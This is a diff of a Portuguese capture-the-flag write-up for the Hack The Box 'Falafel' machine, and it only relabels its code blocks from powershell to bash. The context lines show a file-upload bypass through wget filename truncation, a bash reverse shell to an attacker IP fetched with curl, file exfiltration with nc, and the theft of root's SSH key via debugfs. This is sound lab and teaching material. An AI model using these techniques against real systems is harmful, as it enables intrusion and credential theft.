@@ -43,7 +43,7 @@ O resultado do nmap indica-nos que estamos que o nosso alvo é uma máquina Linu
 
 Só pela página principal, já obtemos informações potencialmente úteis. Temos um email (IT@falafel.htb) e com isso, podemos suspeitar existir um usuário (IT) e virtual hosting (falafel.htb).
 
-```powershell
+```bash
 # Adicionar o host ao /etc/hosts
 echo -e "10.10.10.73\tfalafel.htb" >> /etc/hosts
 ```
@@ -54,7 +54,7 @@ Apesar de ser uma suspeita plausível, não existe virtual host.
 
 Antes de falar da página do Login (que é por aí que se vai penetrar a máquina!), irei falar sobre as rotas e potenciais ficheiros da máquina.
 
-```powershell
+```bash
 # Primeira enumeração básica de rotas
 ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r
 
@@ -71,7 +71,7 @@ Vemos um diretório **upload**. Mas por enquanto nada de mais... Temos de procur
 
 O segundo scan que quero rodar é por ficheiros. Sabemos que é um servidor apache com auxilio do nmap, por isso podemos supor que o servidor funcione com ficheiros php. Além disso, o botão de login nós redirige para um login.php. Posto isso, o nosso próximo scan vai ser para procurar ficheiros com extenções php. Podemos também procurar por ficheiros txt...
 
-```powershell
+```bash
 ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php
 
 #>  profile.php             [Status: 200, Size: 7063, Words: 878, Lines: 103]
@@ -213,7 +213,7 @@ Login efectuado com sucesso!
 
 Encontramos o tal painel de upload que chris mencionou. Neste momento, o objectivo é enviar um reverse shell para a máquina vítima, e tentat aceder via URL para o mesmo ser executado. O primeiro passo é descobrir que tipo de ficheiro aceita. A caixa de upload indica ficheiros.png. Vou partilhar um servidor http com uma imagem.png.
 
-```powershell
+```bash
 sudo python3 -m http.server 80
 ```
 
@@ -221,7 +221,7 @@ Conseguimos realmente enviar uma imagem. E a resposa é muito incomum! A respost
 
 A forma de enviar um ficheiro malicioso é surpreendente! O Linux não aceita nomes de arquivos que tenha mais do que 255 caracteres. E o wget está feito para limitar isso, para garantir que receba os arquivos da internet, mesmo com nomes ridiculamente enormes... Tentei então enviar um arquivo de imagem com exatamente 255 caracteres (251 + .png).
 
-```powershell
+```bash
 # Copia da imagem para um arquivo com nome de 251 caracteres seguindo um padrão para depois poder saber ao certo qual é o ponto exacto onde o wget corta o nome
 cp shell.png $(msf-pattern_create -l 251).png
 ```
@@ -230,7 +230,7 @@ cp shell.png $(msf-pattern_create -l 251).png
 
 Pela resposta, sabemso que foi enviado com successo, e que o nome foi alterado, tendo como fim o h7Ah.´
 
-```powershell
+```bash
 msf-pattern_offset -q h7Ah
 #>  [*] Exact match at offset 232
 ```
@@ -254,7 +254,7 @@ Resumindo:
 
 Posto isso, se renomearmos o nosso ficheiro malicioso por um arquivo com (232 carateres + .php + .png), o nome do arquivo irá ser cortado a partir do 236º caracter e ficará assim: (232 chars + .php)
 
-```powershell
+```bash
 cp shell.php $(msf-pattern_create -l 232).php.png
 # Agora que temos o número exato de caracteres, poderíamos ter chamado o ficheiro com 232 "A"... mas na altura não me lembrei e o nome está um pouco agressivo para os olhos!
 ```
@@ -279,7 +279,7 @@ A forma mais fácil de ter um reverse shell sem ter muitos problemas com caracte
 
 Criei então um ficheiro com o nome rev.html contendo o seguinte código:
 
-```powershell
+```bash
 #!/bin/bash
 
 bash -i >& /dev/tcp/10.10.14.17/443 0>&1
@@ -287,7 +287,7 @@ bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 
 Partilhe então um servidor http com este ficheiro, para que através do RCE, poder dar um curl ao ficheiro, e pipeá-lo com bash
 
-```powershell
+```bash
 sudo python3 -m http.server 80  # On one terminal
 sudo nc -lvnp 443               # On another one
 ```
@@ -298,7 +298,7 @@ sudo nc -lvnp 443               # On another one
 
 Já dentro da máquina, ao vasculhar os ficheiros, pode-se encontrar credenciais em /var/www/html/connection.php
 
-```powershell
+```bash
 (remote) www-data@falafel:/var/www/html$ cat connection.php
 <?php
    define('DB_SERVER', 'localhost:3306');
@@ -322,7 +322,7 @@ Esta máquina é um CaptureTheFlag LOL... O próximo passo é completamente irre
 
 com o commando "w" podemos ver que o yossi está actualmente logado fisicamente na máquina
 
-```powershell
+```bash
 w
 #>   22:31:32 up 10:23,  2 users,  load average: 0.00, 0.00, 0.00
 #>  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -332,7 +332,7 @@ w
 
 O usuário com o qual estamos neste momento (moshe) está no grupo "video". Os usuário deste grupo pode ver o que está a ser transmitido para o ecrã. E para tirar uma captura de ecrã sem nenhum recurso adicional, pode-se ir à fonte mesmo. Isto é, capturar o que está em /dev/fb0 com um simples cat. Para ler este arquivo (que vem em formato RAW), temos de saber as dimenções da tela, pois este formato não diz nada sobre dimenções, apenas escreve todos os dados numa linha só e "tá feito". As dimenções actuais do ecrã estão sempre definidas em /sy/class/graphics/fb0/virtual_size
 
-```powershell
+```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 #> 1176,885
@@ -340,7 +340,7 @@ cat /sys/class/graphics/fb0/virtual_size
 
 Recupere a captura de ecrã para o kali
 
-```powershell
+```bash
 nc 10.10.14.17 443 < /tmp/screen.raw  # Target Machine
 nc -lvnp 443 > screen.raw             # kali Machine
 ```
@@ -357,7 +357,7 @@ Entre agora por ssh com o usuário yossi e a sua credencial (que de passagem só
 
 ### Group disk
 
-```powershell
+```bash
 for group in $(groups); do echo -e "\n\n\n[*] Archive with group $group permition:\n"; find / -group $group 2>/dev/null; done
 ```
 
@@ -365,7 +365,7 @@ Este commando permite-nos enumerar todos os ficheiro no qual pertence a cada gru
 
 Este /dev/sda1 é muito simplesmente o disco rígido na qual está instalado o prórpio sistema operativo. Mas não dá para abrir assim...
 
-```powershell
+```bash
 fdisk -l
 #>  Disk /dev/sda: 8 GiB, 8589934592 bytes, 16777216 sectors
 #>  Units: sectors of 1 * 512 = 512 bytes
@@ -388,7 +388,7 @@ ll /dev/sda1
 
 Com a ajuda da ferramente debugfs (ext2/ext3/ext4 file system debugger). Podemos ver ou manipular uma partição, um disco ou o seu conteúdo. Podemos assim facilemente ver a flag root.txt, mas a nós o que nos interessa é vir a ser root! Por sorte, em /root/.ssh existem keys para entrar por ssh, já autorizadas... nem percisamos de fazer mais nada. É só copiar e usar a id_rsa:
 
-```powershell
+```bash
 debugfs /dev/sda1
 debugfs: cd /root/.ssh
 debugfs: cat id_rsa  # copy the content...
